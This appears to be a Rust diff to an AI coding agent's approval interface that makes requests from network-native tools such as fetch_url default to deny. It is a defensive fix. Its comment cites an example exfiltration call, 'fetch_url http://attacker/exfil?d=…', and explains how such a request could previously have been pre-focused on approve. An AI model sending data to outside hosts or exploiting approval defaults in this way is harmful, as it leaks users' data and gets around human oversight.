@@ -59,7 +59,16 @@ impl App {
     /// is here to protect.
     pub(crate) fn park_approval(&mut self, request: ApprovalRequest) {
         let is_root_grant = request.tool_name == deep_code_agent::REQUEST_WRITE_ROOT_TOOL;
-        let deny_by_default = is_root_grant || request.network;
+        // Two ways to reach the network, and the doc above means both.
+        // `request.network` is the DECLARED flag, which only shell / `job start`
+        // / a sub-agent dispatch ever carries; the network-native tools
+        // (`fetch_url`/`web_search`) are network by kind and carry no flag, so
+        // reading the flag alone opened `fetch_url http://attacker/exfil?d=…`
+        // focused on approve — the exact prompt this rule exists for. Same
+        // predicate the runtime's egress floor reads, so the two cannot drift.
+        let reaches_network =
+            request.network || deep_code_agent::is_network_tool(&request.tool_name);
+        let deny_by_default = is_root_grant || reaches_network;
         self.pending_approval = Some(request);
         self.approval_scroll_offset = 0;
         // Deny is last either way, but a prompt with no recordable consent
